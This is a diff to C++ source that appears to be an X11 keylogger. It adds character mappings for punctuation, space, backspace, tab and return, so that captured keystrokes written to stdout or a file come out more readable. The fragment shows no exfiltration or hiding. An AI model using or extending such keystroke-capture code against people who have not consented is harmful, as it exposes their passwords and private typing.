@@ -162,19 +162,35 @@ int main() {
 
                                                 std::string key = XKeysymToString(keypress);
 
+                                                // convert phrases to single char
+                                                if (key == "grave") { key = "`";}
+                                                else if (key == "minus") { key = "-";}
+                                                else if (key == "equal") { key = "=";}
+                                                else if (key == "bracketleft") { key = "[";}
+                                                else if (key == "bracketright") { key = "]";}
+                                                else if (key == "backslash") { key = "\\";}
+                                                else if (key == "semicolon") { key = ";";}
+                                                else if (key == "apostrophe") { key = "'";}
+                                                else if (key == "comma") { key = ",";}
+                                                else if (key == "period") { key = ".";}
+                                                else if (key == "slash") { key = "/";}
+
                                                 // gets capitalized chars
-                                                if (key.length() && capitalization) {
+                                                if (key.length() == 1 && capitalization) {
                                                         char temp_char = caps_char(key.at(0));
                                                         key = "";
                                                         key += temp_char;
                                                         key += '\0';
+                                                } else if (key.length() > 1) {
+                                                        if (key == "space") { key = " "; }
+                                                        else if (key == "BackSpace") { key = "\b"; } // prints backspace characters (use hexdump to view raw output or replace \b with another character)
+                                                        else if (key == "Tab") { key = "\t"; }
+                                                        else if (key == "Return") { key = "\n"; }
                                                 }
-                                                
                                                 std::cout << key;
                                                                                                 
                                                 // Important to flush to write in a file
                                                 // Can alternatively disable buffering in stdout
-
                                                 fflush(stdout);
                                                 break;
                                         }
